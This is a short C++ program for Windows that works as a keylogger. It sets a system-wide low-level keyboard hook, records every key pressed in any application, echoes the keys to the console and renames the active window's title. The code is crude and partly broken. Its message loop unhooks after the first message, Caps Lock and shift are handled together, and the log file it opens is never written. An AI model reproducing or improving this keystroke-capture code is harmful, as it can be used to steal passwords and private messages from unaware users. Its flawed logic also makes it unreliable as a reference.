#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <vector>
using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
HHOOK keyboardHook;
HWND prevWindow;
ofstream logfile;
char title[1024];
bool shifted = false;
bool controlled = false;
bool winkeyed = false;

int main()
{
	cout << "Hoking the keyboard" << endl;
	logfile.open("keyboard.log");
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	cout << "Hook: " << keyboardHook << endl;
	MSG msg{ 0 };
	while (GetMessage(&msg, NULL, 0, 0) != 0) //returns 0 when WM_QUIT gets called				
	UnhookWindowsHookEx(keyboardHook);
	return 0;

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND fwindow = GetForegroundWindow();
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prevWindow != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title, strlen(title) + 1);
			LPWSTR old_title = wtitle;
			SetWindowText(prevWindow, old_title);

			GetWindowTextA(fwindow, title, 1024);
			cout << "Title: " << title << endl;
			SetWindowText(fwindow, L"keyboard hooked application"); //LPCWSTR needs to have L as prefix to assign a string to it
			cout << "Setting title: from \"" << title << "\" to \"" << "keyboard hooked application\"" << endl;
			prevWindow = fwindow;
		}
		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 8: //backspace
			cout << "\b \b";
			break;
		case 32: //space-bar
			cout << " ";
			break;
		case 20:
			if (shifted) {
				shifted = false;
			}
			else {
				shifted = true;
			}
			break;
		case 162: //ctrl
		case 163:
			break;
		case 91: //win-key
			break;
		case 160: //shift
		case 161:
			if (shifted) {
				shifted = false;
			}
			else {
				shifted = true;
			}
			break;
		default:
			if ((current_key >= 65 && current_key <= 90) && shifted == false) { // (A - Z)
				cout << (char)tolower(current_key);
			}
			else if ((current_key >= 65 && current_key <= 90) && shifted == true) { // shifted
				cout << (char)(current_key);
			}
			else if ((current_key >= 48 && current_key <= 57)){
				cout << (char)(current_key);
			}
			else {
				cout << (int)current_key;
			}
			break;
		}
	}
	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
		int current_key = (int)(key->vkCode);
		switch (current_key) {
		case 160:
		case 161:
			if (shifted) {
				shifted = false;
			}
			else {
				shifted = true;
			}
			break;

		}
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}